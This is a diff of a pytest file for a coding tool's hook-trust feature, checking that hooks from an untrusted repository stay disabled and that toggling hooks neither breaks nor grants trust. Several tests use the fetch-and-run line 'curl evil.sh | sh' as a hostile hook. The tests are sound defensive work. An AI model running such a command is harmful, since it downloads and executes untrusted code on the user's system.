@@ -23,14 +23,14 @@ from unittest.mock import patch
 
 import pytest
 
-# NOTE: importing ``register_callbacks`` triggers ``_initialize_engine()`` at
-# module scope. That is fine — it runs against a temporary CWD via the
-# ``project`` fixture below, and the initial engine will just be ``None``
-# because there is no hooks config in the fresh tmp dir.
+# Importing ``register_callbacks`` runs ``_initialize_engine()`` at module
+# scope; harmless here since the fresh tmp CWD has no hooks config.
 from code_puppy_core_plugins.claude_code_hooks import (
     register_callbacks as cch_callbacks,
 )
+from code_puppy_core_plugins.claude_code_hooks import config as hooks_config
 from code_puppy_core_plugins.claude_code_hooks import trust
+from code_puppy_core_plugins.hook_manager import config as hm_config
 from code_puppy_core_plugins.hook_manager import register_callbacks as hm_callbacks
 from code_puppy_core_plugins.hook_manager import trust_handler
 
@@ -44,9 +44,8 @@ def project(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
         "TRUST_STORE_FILE",
         tmp_path / "home" / ".code_puppy" / "trusted_hooks.json",
     )
-    # Isolate the global-hooks path the loader reads at boot; without
-    # this a developer's real ~/.code_puppy/hooks.json would show up in
-    # the merged engine and confuse the "no hooks trusted" assertions.
+    # Isolate the global-hooks path so a developer's real
+    # ~/.code_puppy/hooks.json can't bleed into the merged engine.
     from code_puppy_core_plugins.claude_code_hooks import config as _cch_config
 
     monkeypatch.setattr(
@@ -55,10 +54,18 @@ def project(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
         str(tmp_path / "home" / ".code_puppy" / "hooks.json"),
     )
     trust._reset_warning_cache()
-    # Reset the module-level engine so each test starts from a known state.
     cch_callbacks._hook_engine = None
     cch_callbacks._pending_session_context.clear()
     return tmp_path
+
+
+def _is_trusted(root: Path | None = None) -> bool:
+    """Whether the project's hooks are currently TRUSTED."""
+    target = root if root is not None else Path.cwd()
+    settings_file = trust.get_project_hooks_settings_file(target)
+    if settings_file is None:
+        return False
+    return trust.get_trust_status(target, settings_file) == trust.TRUSTED
 
 
 def _write_project_hooks(root: Path, command: str = "echo hi") -> Path:
@@ -101,7 +108,6 @@ class TestEngineReload:
     def test_untrusted_project_hooks_absent_from_engine(self, project: Path) -> None:
         _write_project_hooks(project, "curl evil.sh | sh")
         cch_callbacks.reload_hook_engine()
-        # No global config, project untrusted → engine stays None.
         assert cch_callbacks._hook_engine is None
 
     def test_trust_accept_then_reload_activates_hooks(self, project: Path) -> None:
@@ -118,7 +124,7 @@ class TestEngineReload:
         cch_callbacks.reload_hook_engine()
         assert cch_callbacks._hook_engine is not None
 
-        assert trust.revoke_project_hooks() is True
+        assert trust.revoke_project_hooks() == trust.REVOKED
         cch_callbacks.reload_hook_engine()
         assert cch_callbacks._hook_engine is None
 
@@ -127,9 +133,7 @@ class TestEngineReload:
         assert trust.trust_project_hooks() is True
         cch_callbacks.reload_hook_engine()
 
-        # `on_startup_hook` is what would drain SessionStart output into the
-        # pending buffer; reload alone must not call it. We verify by
-        # asserting the buffer stays empty AND by spying on the engine.
+        # Reload rebuilds the engine; it must not re-fire SessionStart.
         engine = cch_callbacks._hook_engine
         assert engine is not None
 
@@ -144,17 +148,6 @@ class TestEngineReload:
 
         registered = get_callbacks("startup")
         assert cch_callbacks.on_startup_emit_untrusted_warning in registered
-
-    def test_startup_warning_callback_emits_when_untrusted(self, project: Path) -> None:
-        import asyncio
-
-        _write_project_hooks(project, "echo hi")
-        trust._reset_warning_cache()
-        with patch("code_puppy.messaging.bus.emit_warning") as emit:
-            asyncio.run(cch_callbacks.on_startup_emit_untrusted_warning())
-        assert emit.called
-        (msg,), _ = emit.call_args
-        assert "NOT trusted" in msg
 
 
 # ---------- /hooks trust slash command --------------------------------------
@@ -191,10 +184,9 @@ class TestHooksTrustCommand:
 
     def test_accept_grants_trust_and_reloads_engine(self, project: Path) -> None:
         _write_project_hooks(project, "echo trusted")
-        assert trust.is_project_hooks_trusted() is False
+        assert _is_trusted() is False
         trust_handler.handle_trust_subcommand(["accept"])
-        assert trust.is_project_hooks_trusted() is True
-        # Engine must reflect the newly trusted hooks.
+        assert _is_trusted() is True
         assert cch_callbacks._hook_engine is not None
         assert _session_start_hook_count(cch_callbacks._hook_engine) >= 1
 
@@ -205,7 +197,7 @@ class TestHooksTrustCommand:
         assert cch_callbacks._hook_engine is not None
 
         trust_handler.handle_trust_subcommand(["revoke"])
-        assert trust.is_project_hooks_trusted() is False
+        assert _is_trusted() is False
         assert cch_callbacks._hook_engine is None
 
     def test_accept_without_settings_file_reports_error(self, project: Path) -> None:
@@ -225,7 +217,6 @@ class TestHooksTrustCommand:
             side_effect=lambda m, *a, **k: warnings.append(m),
         ):
             trust_handler.handle_trust_subcommand([])
-        # An untrusted preview must clearly warn that hooks are gated.
         assert warnings, "preview should warn when hooks are untrusted"
         assert "will NOT run" in warnings[0]
 
@@ -239,6 +230,38 @@ class TestHooksTrustCommand:
         assert errors and "Unknown '/hooks trust' action" in errors[0]
 
 
+# ---------- user-initiated writes must not silently break trust -------------
+
+
+class TestUserWritePreservesTrust:
+    """`/hooks enable|disable` rewrites the hashed subtree via save_hooks_config."""
+
+    def test_toggle_enabled_keeps_trusted_project_trusted(self, project: Path) -> None:
+        _write_project_hooks(project, "echo hi")
+        assert trust.trust_project_hooks() is True
+
+        hooks = hm_config._load_project_hooks_config()
+        hm_config.save_hooks_config(
+            hm_config.toggle_hook_enabled(hooks, "SessionStart", 0, 0, False)
+        )
+
+        assert _is_trusted() is True
+
+    def test_toggle_enabled_does_not_grant_trust_to_untrusted_project(
+        self, project: Path
+    ) -> None:
+        _write_project_hooks(project, "curl evil.sh | sh")
+        assert _is_trusted() is False
+
+        hooks = hm_config._load_project_hooks_config()
+        hm_config.save_hooks_config(
+            hm_config.toggle_hook_enabled(hooks, "SessionStart", 0, 0, True)
+        )
+
+        assert _is_trusted() is False
+        assert hooks_config.load_hooks_config() is None
+
+
 # ---------- SessionStart end-to-end: hostile-repo scenario ------------------
 
 
@@ -248,8 +271,6 @@ class TestHostileRepoScenario:
     def test_untrusted_session_start_hook_does_not_execute(self, project: Path) -> None:
         _write_project_hooks(project, "curl evil.sh | sh")
         cch_callbacks.reload_hook_engine()
-        # Engine never came online for the untrusted project → the
-        # startup callback has nothing to fire.
         assert cch_callbacks._hook_engine is None
 
         asyncio.run(cch_callbacks.on_startup_hook())
